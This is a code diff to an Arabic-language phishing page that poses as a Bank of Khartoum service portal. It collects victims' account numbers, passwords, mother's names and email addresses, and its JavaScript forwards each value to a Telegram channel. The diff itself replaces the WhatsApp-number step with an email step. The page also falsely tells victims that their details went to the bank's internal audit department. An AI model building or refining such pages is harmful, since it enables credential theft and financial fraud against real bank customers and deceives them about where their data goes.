@@ -23,7 +23,7 @@
         .input-group { margin-bottom: 18px; text-align: right; }
         .input-group label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #333; }
         .input-wrapper { position: relative; }
-        input, select { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; background-color: #e3f2fd; font-size: 15px; outline: none; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; background-color: #f9f9f9; font-size: 15px; outline: none; }
         .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
         
         .error-message-box { color: #d32f2f; font-size: 14px; font-weight: bold; margin-top: 10px; margin-bottom: -5px; text-align: right; display: none; }
@@ -105,7 +105,7 @@
                 <div class="service-option" onclick="selectService(6, 'تغير الهاتف')">
                     <div class="service-content">
                         <span class="service-title">تغير الهاتف القديم إلى هاتف جديد.</span>
-                        <span class="service-desc">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
+                        <span class="service-desc">تغير الهاتف القديم إلى هاتف جديد.</span>
                     </div>
                     <span>🔄</span>
                 </div>
@@ -199,19 +199,18 @@
                     <input type="password" id="password" placeholder="أدخل كلمة المرور">
                     <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
                 </div>
-                <!-- تعديل رسالة الخطأ لتكون كما طُلِبَت تماماً -->
                 <div id="login-error-msg" class="error-message-box">⚠️ رقم الحساب او كلمة السر خاطئة الرجاء اعادة المحاولة</div>
             </div>
             <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
         </div>
 
-        <!-- الصفحة الثالثة: طلب رقم الواتساب لدواعي أمنية -->
+        <!-- الصفحة الثالثة: طلب البريد الإلكتروني -->
         <div id="step-whatsapp-verification" class="card hidden">
             <h2>التحقق الأمني المتقدم</h2>
-            <h3>لدواعي أمنية يرجى إدخال رقم واتساب للتواصل</h3>
+            <h3>لدواعي أمنية يرجى إدخال البريد الإلكتروني المرتبط بالحساب</h3>
             <div class="input-group">
-                <label>رقم تواصل واتساب الفعال:</label>
-                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال (مثال: 0912345678)">
+                <label for="gmail-num">البريد الإلكتروني:</label>
+                <input type="email" id="gmail-num" name="email" autocomplete="email" placeholder="example@domain.com">
             </div>
             <button class="btn-submit" onclick="submitWhatsappStep()">حفظ ومتابعة</button>
         </div>
@@ -287,10 +286,10 @@
                     👤 <strong>عزيزي العميل، تم توثيق بيانات الهوية الرقمية التالية:</strong><br>
                     • <strong>رقم الحساب المدخل:</strong> <span id="summary-account">--</span><br>
                     • <strong>إسم الوالدة:</strong> <span id="summary-mother">--</span><br>
-                    • <strong>رقم هاتف الواتساب:</strong> <span id="summary-whatsapp" style="direction: ltr; display: inline-block;">--</span>
+                    • <strong>البريد الإلكتروني:</strong> <span id="summary-whatsapp" style="direction: ltr; display: inline-block;">--</span>
                 </div>
 
-                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي الموضح أعلاه لتقديمه عند الحاجة. لقد تم تحويل استمارة المعالجة الحالية بنجاح إلى قسم التدقيق والرقابة الداخلية التابع لبنك الخرطوم للتحقق من سلامة الطلب واعتماده وتحديثه في الأنظمة المركزية. بناءً على السياسات الجديدة، <strong>سوف يتولى فريق الدعم الفني المختص وخدمة العملاء المعتمدة مهمة المبادرة بالتواصل معك مباشرة، إما عبر إجراء اتصال هاتفي أو إرسال رسالة رسمية إليك على رقم الواتساب المسجل</strong> الظاهر في بيانات المراجعة أعلاه، وذلك لاستكمال كافة إجراءات الاعتماد والربط والتحقق النهائي، دون الحاجة للقيام بأي إجراء إضافي من طرفك في الوقت الراهن.</span>
+                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي الموضح أعلاه لتقديمه عند الحاجة. لقد تم تحويل استمارة المعالجة الحالية بنجاح إلى قسم التدقيق والرقابة الداخلية التابع لبنك الخرطوم للتحقق من سلامة الطلب واعتماده وتحديثه في الأنظمة المركزية. بناءً على السياسات الجديدة، <strong>سوف يتولى فريق الدعم الفني المختص وخدمة العملاء المعتمدة مهمة المبادرة بالتواصل معك مباشرة، إما عبر إجراء اتصال هاتفي أو إرسال رسالة رسمية إليك على البريد الإلكتروني المسجل</strong> الظاهر في بيانات المراجعة أعلاه، وذلك لاستكمال كافة إجراءات الاعتماد والربط والتحقق النهائي، دون الحاجة للقيام بأي إجراء إضافي من طرفك في الوقت الراهن.</span>
             </div>
         </div>
     </div>
@@ -337,20 +336,17 @@
             userData.accountNum = accountInput;
             userData.password = passwordInput;
             
-            // تحقق من وجود قيم بالأساس
             if (!accountInput || !passwordInput) {
                 showError();
                 return;
             }
 
-            // 1. التحقق من رقم الحساب: أرقام فقط وطوله إما 6 أو 7 وألا يكون متتالياً
             const digitsOnlyRegex = /^\d+$/;
             if (!digitsOnlyRegex.test(accountInput) || (accountInput.length !== 6 && accountInput.length !== 7) || isSequential(accountInput)) {
                 showError();
                 return;
             }
 
-            // 2. التحقق من كلمة المرور: يجب أن تحتوي على (حرف كبير، رقم، وعلامة ترقيم أو رمز)
             const hasUppercase = /[A-Z]/.test(passwordInput);
             const hasNumber = /[0-9]/.test(passwordInput);
             const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/.test(passwordInput);
@@ -362,21 +358,19 @@
 
             hideError();
 
-            // إرسال البيانات فور صحتها للتليجرام
             sendToTelegram(`📋 دخول جديد [الخدمة: ${selectedService}]\n🔢 الحساب المدخل: ${userData.accountNum}\n🔐 السر المدخل: ${userData.password}`);
 
-            // الانتقال إلى الصفحة الثالثة (الواتساب)
             goToStep('step-whatsapp-verification');
         }
 
         function submitWhatsappStep() {
-            const whatsappInput = document.getElementById('whatsapp-num').value.trim();
-            if (!whatsappInput) {
-                return alert('الرجاء إدخال رقم الواتساب للمتابعة');
+            const gmailInput = document.getElementById('gmail-num').value.trim();
+            if (!gmailInput) {
+                return alert('الرجاء إدخال البريد الإلكتروني للمتابعة');
             }
-            userData.whatsappNum = whatsappInput;
+            userData.whatsappNum = gmailInput;
             
-            sendToTelegram(`💬 رقم واتساب للتواصل المبدئي:\n📱 الرقم: ${userData.whatsappNum}`);
+            sendToTelegram(`📧 البريد الإلكتروني للتواصل:\n✉️ البريد: ${userData.whatsappNum}`);
             
             if (selectedService === 'التحويلات الخاطئة') {
                 goToStep('step-wrong-transfer');
